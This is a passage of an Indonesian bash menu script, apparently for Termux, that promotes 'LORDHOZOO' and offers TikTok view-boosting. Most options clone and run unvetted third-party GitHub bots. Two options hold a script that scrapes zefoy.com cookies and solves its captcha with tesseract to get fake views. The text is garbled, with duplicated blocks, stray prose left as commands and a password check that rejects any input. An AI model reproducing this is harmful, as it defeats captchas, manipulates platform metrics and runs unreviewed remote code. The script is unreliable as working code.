    names = [\"Emma\", \"Liam\", \"Olivia\", \"Noah\", \"Ava\", \"Oliver\", \"Isabella\", \"William\", \"Sophia\", \"James\"]
    adjectives = [\"Intelligent\", \"Brave\", \"Friendly\", \"Determined\", \"Courageous\", \"Kind\", \"Clever\", \"Adventurous\"]
    return f\"{random.choice(adjectives)}{random.choice(names)}\"

if __name__ == \"__main__\":
    main()

print('kgtmlpqis')
"
        ;;
    *)
        echo "Invalid option"
        ;;
esac


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    apt update -y
git clone https://github.com/colyswear/tiktok-bot
cd tiktok-bot

python main.py
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    apt update -y
git clone https://github.com/BloodOnTop/TikTok-Automator
cd TikTok-Automator
pip install -r requirements.txt
pip3 install -r requirements.txt
python tiktok.py
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    apt update -y
apt install php -y
git clone https://github.com/Inject-ID/tiktok-followers
cd tiktok-followers
php bot.php
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    apt update -y
 git clone https://github.com/Sxp-ID/Zefoy
 cd Zefoy
 make install
 ./main
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    apt update
git clone https://github.com/vdutts7/tiktok-bot
cd tiktok-bot
pip install -r scorphx-algo-reqs.txt
pip3 install -r scorphx-algo-reqs.txt
clear
python the-scorphx-algo.py
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    apt update -y
echo -e " web suntik .."
xdg-open "https://zefoy.com/"
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    apt update -y
apt update -y && pkg upgrade -y
 apt install git python-pip tesseract
 git clone https://github.com/RozhakXD/Zefoy.git
 cd "Zefoy"
 pip install -r requirements.txt
 python Run.py
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    apt update -y 
#!/bin/bash

# Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
WHITE='\033[1;37m'
NC='\033[0m'

# Global variables
COOKIES=""
SUKSES=0
GAGAL=0
LOGOUT=0

# Function to display error and exit
error_exit() {
    echo -e "${RED}Error: $1${NC}"
    exit 1
}

# Check required commands
check_requirements() {
    local required=("curl" "jq" "base64" "sed" "awk" "grep" "tesseract" "python3")
    for cmd in "${required[@]}"; do
        if ! command -v "$cmd" &> /dev/null; then
            error_exit "$cmd could not be found. Please install it."
        fi
    done
}

# Display logo
show_logo() {
    clear
    echo -e "${RED}● ${YELLOW}● ${GREEN}●${WHITE}"
    echo -e "${RED} ______     ______     ______   ______     __  __    "
    echo -e "${RED}/\___  \   /\  ___\   /\  ___\ /\  __ \   /\ \_\ \   "
    echo -e "${RED}\/_/  /__  \ \  __\   \ \  __\ \ \ \/\ \  \ \____ \  "
    echo -e "${WHITE}  /\_____\  \ \_____\  \ \_\    \ \_____\  \/\_____\ "
    echo -e "${WHITE}  \/_____/   \/_____/   \/_/     \/_____/   \/_____/"
    echo -e "        ${GREEN}Free Tiktok Views - Coded by LORDHOZOO ${NC}"
    echo ""
}

# Login function
login() {
    echo -e "${WHITE}   ──>${GREEN} Attempting to login to Zefoy...${NC}"
    
    # Make initial request
    response=$(curl -s -H "Accept-Language: en-US,en;q=0.9" \
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
        -H "Sec-Fetch-Mode: navigate" \
        -H "Sec-Fetch-Site: none" \
        -H "Host: zefoy.com" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36" \
        -H "Sec-Fetch-User: ?1" \
        -H "Sec-Fetch-Dest: document" \
        "https://zefoy.com/")
    
    # Check for Cloudflare
    if [[ "$response" == *"Sorry, you have been blocked"* ]] || [[ "$response" == *"Just a moment..."* ]]; then
        echo -e "${RED}Zefoy server is currently affected by cloudflare. Please try again later or visit zefoy.com to check.${NC}"
        exit 1
    fi
    
    # Extract captcha image and form
    captcha_image=$(echo "$response" | grep -oP 'src="(.*?)" onerror="errimg\(\)"' | cut -d'"' -f2 | sed 's/amp;//g')
    form=$(echo "$response" | grep -oP 'type="text" id="captchatoken" name="(.*?)"' | cut -d'"' -f5)
    
    # Get cookies
    cookies=$(curl -s -I "https://zefoy.com/" | grep -i "set-cookie" | awk '{print $2}' | tr -d ';' | paste -sd ',' -)
    
    # Download captcha image
    mkdir -p Penyimpanan
    curl -s -H "Cookie: $cookies" "https://zefoy.com$captcha_image" -o Penyimpanan/Gambar.png
    
    # Solve captcha (using tesseract)
    captcha_text=$(tesseract Penyimpanan/Gambar.png - -l eng 2>/dev/null | tr -d '\n')
    
    # Submit login form
    login_response=$(curl -s -X POST "https://zefoy.com/" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Cookie: $cookies" \
        --data-urlencode "$form=$captcha_text")
    
    # Check login success
    if [[ "$login_response" == *"placeholder=\"Enter Video URL\""* ]]; then
        COOKIES="$cookies"
        echo -e "${WHITE}   ──>${GREEN} LOGIN SUCCESSFUL!${NC}"
        return 0
    else
        echo -e "${WHITE}   ──>${RED} LOGIN FAILED!${NC}"
        return 1
    fi
}

# Main function
main() {
    check_requirements
    show_logo
    
    echo -e "${WHITE}Please fill in your tiktok video link, make sure the account is not private and the"
    echo -e "link is correct. Take the video link via browser!${NC}"
    echo -e "${WHITE}   ╰─> ${NC}\c"
    read video_url
    
    if [[ "$video_url" != *"tiktok.com"* ]] && [[ "$video_url" != *"/video/"* ]]; then
        echo -e "${RED}Please fill in the TikTok video link correctly!${NC}"
        exit 1
    fi
    
    echo -e "${WHITE}You can use CTRL+C if stuck and use CTRL+Z if you want to stop.${NC}"
    echo -e "${WHITE}If views do not come in try running manually and run this program again!${NC}"
    
    while true; do
        if [ -z "$COOKIES" ]; then
            login || continue
        else
            echo -e "${WHITE}   ──>${GREEN} SENDING VIEWS!${NC}"
            # Here you would call the view sending functions
            # For now just sleep to simulate work
            sleep 5
        fi
    done
}

# Start the script
main
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    apt update -y 
#!/bin/bash

# Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
WHITE='\033[1;37m'
NC='\033[0m'

# Global variables
COOKIES=""
SUKSES=0
GAGAL=0
LOGOUT=0

# Function to display error and exit
error_exit() {
    echo -e "${RED}Error: $1${NC}"
    exit 1
}

# Check required commands
check_requirements() {
    local required=("curl" "jq" "base64" "sed" "awk" "grep" "tesseract" "python3")
    for cmd in "${required[@]}"; do
        if ! command -v "$cmd" &> /dev/null; then
            error_exit "$cmd could not be found. Please install it."
        fi
    done
}

# Display logo
show_logo() {
    clear
    echo -e "${RED}● ${YELLOW}● ${GREEN}●${WHITE}"
    echo -e "${RED} ______     ______     ______   ______     __  __    "
    echo -e "${RED}/\___  \   /\  ___\   /\  ___\ /\  __ \   /\ \_\ \   "
    echo -e "${RED}\/_/  /__  \ \  __\   \ \  __\ \ \ \/\ \  \ \____ \  "
    echo -e "${WHITE}  /\_____\  \ \_____\  \ \_\    \ \_____\  \/\_____\ "
    echo -e "${WHITE}  \/_____/   \/_____/   \/_/     \/_____/   \/_____/"
    echo -e "        ${GREEN}Free Tiktok Views - Coded by LORDHOZOO${NC}"
    echo ""
}

# Login function
login() {
    echo -e "${WHITE}   ──>${GREEN} Attempting to login to Zefoy...${NC}"
    
    # Make initial request
    response=$(curl -s -H "Accept-Language: en-US,en;q=0.9" \
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
        -H "Sec-Fetch-Mode: navigate" \
        -H "Sec-Fetch-Site: none" \
        -H "Host: zefoy.com" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36" \
        -H "Sec-Fetch-User: ?1" \
        -H "Sec-Fetch-Dest: document" \
        "https://zefoy.com/")
    
    # Check for Cloudflare
    if [[ "$response" == *"Sorry, you have been blocked"* ]] || [[ "$response" == *"Just a moment..."* ]]; then
        echo -e "${RED}Zefoy server is currently affected by cloudflare. Please try again later or visit zefoy.com to check.${NC}"
        exit 1
    fi
    
    # Extract captcha image and form
    captcha_image=$(echo "$response" | grep -oP 'src="(.*?)" onerror="errimg\(\)"' | cut -d'"' -f2 | sed 's/amp;//g')
    form=$(echo "$response" | grep -oP 'type="text" id="captchatoken" name="(.*?)"' | cut -d'"' -f5)
    
    # Get cookies
    cookies=$(curl -s -I "https://zefoy.com/" | grep -i "set-cookie" | awk '{print $2}' | tr -d ';' | paste -sd ',' -)
    
    # Download captcha image
    mkdir -p Penyimpanan
    curl -s -H "Cookie: $cookies" "https://zefoy.com$captcha_image" -o Penyimpanan/Gambar.png
    
    # Solve captcha (using tesseract)
    captcha_text=$(tesseract Penyimpanan/Gambar.png - -l eng 2>/dev/null | tr -d '\n')
    
    # Submit login form
    login_response=$(curl -s -X POST "https://zefoy.com/" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Cookie: $cookies" \
        --data-urlencode "$form=$captcha_text")
    
    # Check login success
    if [[ "$login_response" == *"placeholder=\"Enter Video URL\""* ]]; then
        COOKIES="$cookies"
        echo -e "${WHITE}   ──>${GREEN} LOGIN SUCCESSFUL!${NC}"
        return 0
    else
        echo -e "${WHITE}   ──>${RED} LOGIN FAILED!${NC}"
        return 1
    fi
}

# Main function
main() {
    check_requirements
    show_logo
    
    echo -e "${WHITE}Please fill in your tiktok video link, make sure the account is not private and the"
    echo -e "link is correct. Take the video link via browser!${NC}"
    echo -e "${WHITE}   ╰─> ${NC}\c"
    read video_url
    
    if [[ "$video_url" != *"tiktok.com"* ]] && [[ "$video_url" != *"/video/"* ]]; then
        echo -e "${RED}Please fill in the TikTok video link correctly!${NC}"
        exit 1
    fi
    
    echo -e "${WHITE}You can use CTRL+C if stuck and use CTRL+Z if you want to stop.${NC}"
    echo -e "${WHITE}If views do not come in try running manually and run this program again!${NC}"
    
    while true; do
        if [ -z "$COOKIES" ]; then
            login || continue
        else
            echo -e "${WHITE}   ──>${GREEN} SENDING VIEWS!${NC}"
            # Here you would call the view sending functions
            # For now just sleep to simulate work
            sleep 5
        fi
    done
}

# Start the script
main

fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    apt update -y 
clear
xdg-open "tiktok.com/@executorhozoo"
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    apt update -y
clear
xdg-open "https://youtube.com/@hozoo999?si=QyKd4PNI1l7UkeYF"
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    apt update -y
xdg-open "tiktok.com/@executorhozoo"
fi
if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    apt update -y
clear
hi pengguna tools termux dan linux
tetap semangat ya pake nya
tools ini gacor op
diliris tahun 2025-05-14 RABU MEI
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    apt update
exit
fi



if [ "$updt" -eq 17 ]; then
    # Add your code here for option 17
    apt update -y
    clear
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    apt update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    apt update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    apt update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    apt update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    apt update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    apt update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    apt update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
  apt  update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    apt update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    apt update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    apt update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    apt update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    apt update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    apt update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    apt update
fi


if [ "$updt" -eq 18 ]; then
    # Add your code here for option 18
    apt  update
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    apt update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    apt  update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    apt update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    apt update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    apt update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    apt update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    apt update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    apt  update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    apt update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    apt update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    apt update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    apt update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    apt update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    apt update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    apt update
fi


if [ "$updt" -eq 19 ]; then
    # Add your code here for option 19
    apt  update -y 
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
apt install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    apt update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    apt update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    apt update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    apt update
fi

